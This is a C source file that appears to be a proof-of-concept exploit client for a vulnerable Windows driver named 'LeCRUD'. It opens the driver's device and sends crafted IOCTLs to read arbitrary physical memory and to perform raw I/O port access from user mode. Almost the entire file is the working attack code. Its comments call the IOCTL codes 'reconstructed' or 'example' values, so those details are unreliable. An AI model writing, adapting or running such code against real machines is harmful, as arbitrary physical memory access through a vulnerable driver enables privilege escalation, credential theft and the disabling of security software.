#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

// LeCRUD device symbolic link
#define LECRUD_DEVICE_NAME "\\\\.\\LeCRUD"

// Reconstructed IOCTL control code pattern used by LeCRUD for its operations
// (Based on the LowPart check: -1673517940 / 0x9C402004 style custom codes, or standard device control)
#define IOCTL_LECRUD_MAP_PHYSICAL   0x9C402004 // Example control code for physical map
#define IOCTL_LECRUD_PORT_IO        0x9C402018 // Example control code for port access
#define IOCTL_LECRUD_SMBIOS         0x9C402010 // Example control code for SMBIOS parse

// Structure mimicking the input payload expected by the driver's physical mapping routine
typedef struct _LECRUD_PHYSICAL_PAYLOAD {
    ULONG Signature;       // E.g., "SM" / validation bytes
    ULONG Unused1;
    ULONG Unused2;
    ULONG PhysicalAddress; // Target physical address to map via MmMapIoSpace
    ULONG TransferSize;    // Size of the mapping window
    ULONG Flags;
    // Followed by optional data buffer space
} LECRUD_PHYSICAL_PAYLOAD, *PLECRUD_PHYSICAL_PAYLOAD;

int main() {
    printf("[*] Attempting to open handle to %s...\n", LECRUD_DEVICE_NAME);

    // 1. Open a handle to the vulnerable driver
    HANDLE hDevice = CreateFileA(
        LECRUD_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device handle. Error: %lu\n", GetLastError());
        printf("[-] Note: The driver must be loaded and running for this to succeed.\n");
        return 1;
    }

    printf("[+] Successfully opened handle to LeCRUD!\n");

    DWORD bytesReturned = 0;

    // ==========================================
    // DEMO 1: Arbitrary Physical Memory Read
    // ==========================================
    {
        // Allocate a buffer large enough for the payload and the target data read size
        DWORD payloadSize = sizeof(LECRUD_PHYSICAL_PAYLOAD) + 4096;
        PLECRUD_PHYSICAL_PAYLOAD pPayload = (PLECRUD_PHYSICAL_PAYLOAD)LocalAlloc(LPTR, payloadSize);

        if (pPayload) {
            // Set up the payload to target a physical address (e.g., physical address 0x1000)
            pPayload->Signature = 0x534D0020;    // Matches the driver's expected validation range (~"SM")
            pPayload->PhysicalAddress = 0x1000;  // Target Physical Address
            pPayload->TransferSize = 4096;       // 1 Page size

            unsigned char outputBuffer[4096] = { 0 };

            printf("[*] Sending IOCTL to map and read physical memory at 0x%X...\n", pPayload->PhysicalAddress);

            BOOL success = DeviceIoControl(
                hDevice,
                IOCTL_LECRUD_MAP_PHYSICAL,
                pPayload,
                payloadSize,
                outputBuffer,
                sizeof(outputBuffer),
                &bytesReturned,
                NULL
            );

            if (success) {
                printf("[+] Physical memory read successfully! Bytes returned: %lu\n", bytesReturned);
                printf("[+] First 16 bytes: ");
                for (int i = 0; i < 16; i++) {
                    printf("%02X ", outputBuffer[i]);
                }
                printf("\n");
            } else {
                printf("[-] IOCTL failed. Error: %lu\n", GetLastError());
            }

            LocalFree(pPayload);
        }
    }

    // ==========================================
    // DEMO 2: Port I/O Execution Example
    // ==========================================
    {
        // The driver's port I/O handler takes input parameters specifying:
        // - Port address (e.g., 0xCF8 / 0xCFC or custom ports)
        // - Operation type (Byte, Word, Dword input/output)
        
        struct {
            ULONG Unused;
            USHORT PortAddress;
            UCHAR AccessSize; // 1 = inbyte, 2 = inword, 3 = indword, 4 = outbyte, etc.
            UCHAR Direction;
            ULONG ValueToWrite;
        } portPayload = { 0 };

        portPayload.PortAddress = 0x80; // Example post-code port or custom I/O port
        portPayload.AccessSize = 1;     // Byte read (__inbyte)
        
        DWORD portOutput = 0;

        printf("[*] Sending IOCTL to read from I/O port 0x%X...\n", portPayload.PortAddress);

        BOOL success = DeviceIoControl(
            hDevice,
            IOCTL_LECRUD_PORT_IO,
            &portPayload,
            sizeof(portPayload),
            &portOutput,
            sizeof(portOutput),
            &bytesReturned,
            NULL
        );

        if (success) {
            printf("[+] Port I/O executed successfully. Read value: 0x%X\n", portOutput);
        } else {
            printf("[-] Port I/O IOCTL failed. Error: %lu\n", GetLastError());
        }
    }

    CloseHandle(hDevice);
    printf("[*] Closed handle. Done.\n");
    return 0;
}